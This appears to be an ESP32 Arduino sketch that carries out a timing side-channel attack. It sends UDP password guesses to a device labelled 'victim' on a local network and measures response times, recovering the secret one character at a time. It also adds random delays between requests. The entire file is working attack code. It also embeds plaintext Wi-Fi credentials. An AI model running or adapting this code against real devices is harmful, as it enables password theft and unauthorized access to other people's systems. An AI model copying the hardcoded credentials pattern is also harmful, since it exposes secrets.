#include <WiFi.h>
#include <WiFiUdp.h>

const char* ssid = "nalAr@1205";
const char* password = "Arya@#1205";
WiFiUDP udp;
IPAddress victimIP(192, 168, 253, 22); 
unsigned int victimPort = 4210;

const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
char guess[64] = "";
int position = 0;

#define SAMPLES_PER_CHAR 30
#define BATCH_SIZE 5
#define MAX_REQUEST_DELAY 50 
#define EXPECTED_SIGNAL_PER_CHAR 500
#define MIN_DIFF_FACTOR 1.3 
#define CONFIDENCE_THRESHOLD 0.8  

typedef struct {
  unsigned long times[SAMPLES_PER_CHAR];
  int count;
  unsigned long avg;
  unsigned long min;
  unsigned long max;
  float stdDev;
} TimingStats;

TimingStats stats[sizeof(charset)];

void setup() {
  Serial.begin(115200);
  Serial.println("\nESP32 Precise Timing Side-Channel Attack");
  Serial.println("---------------------------------------");
  WiFi.begin(ssid, password);
  Serial.print("Connecting to WiFi");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  
  Serial.println("\nConnected to WiFi");
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
  delay(1000);
  
  Serial.println("Target IP: " + victimIP.toString() + ":" + String(victimPort));
  Serial.println("Starting attack...");
}

void resetStats() {
  for (int i = 0; i < strlen(charset); i++) {
    stats[i].count = 0;
    stats[i].avg = 0;
    stats[i].min = ULONG_MAX;
    stats[i].max = 0;
    stats[i].stdDev = 0;
  }
}

void calculateStats(int charIndex) {
  unsigned long sum = 0;
  
  for (int i = 0; i < stats[charIndex].count; i++) {
    sum += stats[charIndex].times[i];
  }
  
  if (stats[charIndex].count > 0) {
    stats[charIndex].avg = sum / stats[charIndex].count;
  }
  
  float sumSquareDiff = 0;
  for (int i = 0; i < stats[charIndex].count; i++) {
    unsigned long time = stats[charIndex].times[i];
    
    if (time < stats[charIndex].min) stats[charIndex].min = time;
    if (time > stats[charIndex].max) stats[charIndex].max = time;
    
    float diff = time - stats[charIndex].avg;
    sumSquareDiff += diff * diff;
  }
  
  if (stats[charIndex].count > 1) {
    stats[charIndex].stdDev = sqrt(sumSquareDiff / (stats[charIndex].count - 1));
  }
}
unsigned long sendRequest(const char* testStr) {
  char buffer[100];
  unsigned long startTime = micros();
  

  udp.beginPacket(victimIP, victimPort);
  udp.write((const uint8_t*)testStr, strlen(testStr));
  udp.endPacket();
  int packetSize = 0;
  unsigned long timeout = millis();
  while (!(packetSize = udp.parsePacket())) {
    if (millis() - timeout > 1000) {  
      return 0;  
    }
  }
  
  udp.read(buffer, sizeof(buffer));
  
  return micros() - startTime;
}

bool findNextCharacter() {
  Serial.print("\n\nCurrent guess: [");
  Serial.print(guess);
  Serial.println("]");
  Serial.println("Finding character at position " + String(position) + "...");
  resetStats();
  
  char baselineGuess[64];
  strcpy(baselineGuess, guess);
  baselineGuess[position] = 'A';  
  
  unsigned long baselineTime = 0;
  int baselineSamples = 10;
  
  for (int i = 0; i < baselineSamples; i++) {
    unsigned long time = sendRequest(baselineGuess);
    if (time > 0) {
      baselineTime += time;
    }
    delay(random(10, MAX_REQUEST_DELAY));
  }
  
  baselineTime = baselineTime / baselineSamples;
  Serial.println("Baseline response time: " + String(baselineTime) + " μs");
  
  for (int start = 0; start < strlen(charset); start += BATCH_SIZE) {
    for (int sample = 0; sample < SAMPLES_PER_CHAR; sample++) {
      for (int i = 0; i < BATCH_SIZE && (start + i) < strlen(charset); i++) {
        int charIndex = start + i;
        char testChar = charset[charIndex];
        char testStr[64];
        strcpy(testStr, guess);
        testStr[position] = testChar;
        testStr[position + 1] = '\0';
        unsigned long responseTime = sendRequest(testStr);
        if (responseTime > 0 && stats[charIndex].count < SAMPLES_PER_CHAR) {
          stats[charIndex].times[stats[charIndex].count++] = responseTime;
        }
        delay(random(5, MAX_REQUEST_DELAY));
      }
      delay(random(30, 100));
    }
  }
  
  for (int i = 0; i < strlen(charset); i++) {
    calculateStats(i);
  }
  
  Serial.println("\nTiming analysis for position " + String(position) + ":");
  Serial.println("----------------------------------------------");
  Serial.println("Char | Avg Time (μs) | Min | Max | StdDev | Samples");
  Serial.println("----------------------------------------------");
  
  for (int i = 0; i < strlen(charset); i++) {
    if (stats[i].count > 0) {
      Serial.print(" ");
      Serial.print(charset[i]);
      Serial.print("   | ");
      Serial.print(stats[i].avg);
      Serial.print(" | ");
      Serial.print(stats[i].min);
      Serial.print(" | ");
      Serial.print(stats[i].max);
      Serial.print(" | ");
      Serial.print(stats[i].stdDev, 1);
      Serial.print(" | ");
      Serial.print(stats[i].count);
      Serial.println();
    }
  }
  
  int bestIndex = -1;
  unsigned long bestTime = 0;
  unsigned long secondBestTime = 0;
  
  for (int i = 0; i < strlen(charset); i++) {
    if (stats[i].count > SAMPLES_PER_CHAR * 0.7) {  
      if (stats[i].avg > bestTime) {
        secondBestTime = bestTime;
        bestTime = stats[i].avg;
        bestIndex = i;
      } else if (stats[i].avg > secondBestTime) {
        secondBestTime = stats[i].avg;
      }
    }
  }
  
  if (bestIndex >= 0) {
    float timeDiff = (float)bestTime / (secondBestTime > 0 ? secondBestTime : baselineTime);
    float expectedTimeForPos = baselineTime + ((position + 1) * EXPECTED_SIGNAL_PER_CHAR);
    
    Serial.println("\nBest character: '" + String(charset[bestIndex]) + 
                   "' with avg time " + String(bestTime) + " μs");
    Serial.println("Second best time: " + String(secondBestTime) + " μs");
    Serial.println("Difference factor: " + String(timeDiff));
    Serial.println("Expected time for this position: ~" + String(expectedTimeForPos) + " μs");
  
    if (timeDiff > MIN_DIFF_FACTOR) {
      guess[position] = charset[bestIndex];
      guess[position + 1] = '\0';
      position++;
      
      Serial.println("\n✓ CONFIRMED CHARACTER: '" + String(charset[bestIndex]) + "'");
      Serial.println("Password so far: [" + String(guess) + "]");
    
      if (position > 1 && bestTime < expectedTimeForPos * 0.7) {
        Serial.println("\n⚠️ Password might be complete - response time dropped significantly.");
      }
      
      return true;
    } else {
      Serial.println("\n⚠️ No clear winner - difference between candidates too small.");
      return false;
    }
  } else {
    Serial.println("\n⚠️ Not enough reliable measurements to determine next character.");
    return false;
  }
}

void loop() {
  if (!findNextCharacter()) {
    Serial.println("\nRetrying position " + String(position) + "...");
  }
  delay(2000);
}